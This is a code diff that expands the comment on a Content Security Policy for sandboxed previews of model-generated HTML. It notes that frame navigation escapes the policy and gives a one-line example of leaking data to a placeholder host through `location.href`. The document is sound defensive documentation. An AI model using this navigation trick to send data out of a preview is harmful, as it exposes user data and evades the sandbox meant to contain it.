@@ -104,9 +104,16 @@ export function isTextArtifact(artifact) {
 
 /**
  * Content Security Policy of a previewed HTML artifact. The preview runs a
- * model's scripts, so it may run inline code but reach nothing outside the
- * document: no `fetch`, WebSocket, remote image/font/frame or form post.
- * Same stance as the MCP Apps sandbox (`default-src 'none'`, `connect-src 'none'`).
+ * model's scripts, so it may run inline code but not load or send anything
+ * through a subresource request: no `fetch`, WebSocket, remote image/font/frame
+ * or form post. Same stance as the MCP Apps sandbox (`default-src 'none'`,
+ * `connect-src 'none'`).
+ *
+ * Known limit: CSP does not govern navigation of the frame itself, and the
+ * iframe's `sandbox="allow-scripts"` does not block it either, so a script can
+ * still run `location.href = 'https://host/?' + data` (or use `<meta refresh>`).
+ * The sandbox does stop top-level navigation, popups and access to the parent,
+ * cookies and storage.
  */
 export const HTML_PREVIEW_CSP =
   "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; media-src data: blob:; form-action 'none'; base-uri 'none'";
